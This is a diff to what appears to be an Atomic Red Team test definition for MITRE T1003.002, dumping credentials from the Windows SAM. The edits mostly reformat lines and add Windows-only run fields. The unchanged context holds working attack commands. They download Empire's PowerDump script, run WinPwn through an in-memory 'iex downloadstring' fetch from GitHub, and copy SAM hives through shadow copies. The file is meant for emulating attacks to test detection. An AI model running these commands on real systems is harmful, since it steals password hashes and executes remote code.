@@ -1,5 +1,5 @@
 attack_technique: T1003.002
-display_name: "OS Credential Dumping: Security Account Manager"
+display_name: 'OS Credential Dumping: Security Account Manager'
 atomic_tests:
 - name: Registry dump of SAM, creds, and secrets
   auto_generated_guid: 5c2571d0-1572-416d-9676-812e64ca9f44
@@ -22,6 +22,8 @@ atomic_tests:
     name: command_prompt
     elevation_required: true
 
+  run_on:
+  - windows
 - name: Registry parse with pypykatz
   auto_generated_guid: a96872b2-cbf3-46cf-8eb4-27e8c0e85263
   description: |
@@ -56,6 +58,8 @@ atomic_tests:
       pypykatz live registry
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: esentutl.exe SAM copy
   auto_generated_guid: a90c2f4d-6726-444e-99d2-a00cd7c20480
   description: |
@@ -84,6 +88,8 @@ atomic_tests:
     cleanup_command: |
       del #{copy_dest}\#{file_name} >nul 2>&1
 
+  run_on:
+  - windows
 - name: PowerDump Hashes and Usernames from Registry
   auto_generated_guid: 804f28fc-68fc-40da-b5a2-e9d0bce5c193
   description: Executes a hashdump by reading the hashes from the registry.
@@ -91,7 +97,8 @@ atomic_tests:
   - windows
   dependencies:
   - description: PowerDump script must exist on disk at specified location
-    prereq_command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1") {exit 0} else {exit 1} '
+    prereq_command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1")
+      {exit 0} else {exit 1} '
     get_prereq_command: |-
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
       Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"
@@ -103,6 +110,8 @@ atomic_tests:
     name: powershell
     elevation_required: true
 
+  run_on:
+  - windows
 - name: dump volume shadow copy hives with certutil
   auto_generated_guid: eeb9751a-d598-42d3-b11c-c122d9c3f6c7
   description: |
@@ -116,7 +125,8 @@ atomic_tests:
       type: string
       default: SAM
     limit:
-      description: Limit to the number of shadow copies to iterate through when trying to copy the hive
+      description: Limit to the number of shadow copies to iterate through when trying
+        to copy the hive
       type: integer
       default: 10
   executor:
@@ -127,6 +137,8 @@ atomic_tests:
     cleanup_command: |
       for /L %a in (1,1,#{limit}) do @(del %temp%\#{target_hive}vss%a >nul 2>&1)
 
+  run_on:
+  - windows
 - name: dump volume shadow copy hives with System.IO.File
   auto_generated_guid: 9d77fed7-05f8-476e-a81b-8ff0472c64d0
   description: |
@@ -139,7 +151,8 @@ atomic_tests:
       type: string
       default: SAM
     limit:
-      description: Limit to the number of shadow copies to iterate through when trying to copy the hive
+      description: Limit to the number of shadow copies to iterate through when trying
+        to copy the hive
       type: integer
       default: 10
   executor:
@@ -155,9 +168,12 @@ atomic_tests:
         rm "$env:TEMP\#{target_hive}vss$_" -ErrorAction Ignore
       }
 
+  run_on:
+  - windows
 - name: WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes
   auto_generated_guid: 0c0f5f06-166a-4f4d-bb4a-719df9a01dbb
-  description: Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn
+  description: Loot local Credentials - Dump SAM-File for NTLM Hashes technique via
+    function of WinPwn
   supported_platforms:
   - windows
   executor:
@@ -166,3 +182,5 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       samfile -consoleoutput -noninteractive  
     name: powershell
+  run_on:
+  - windows
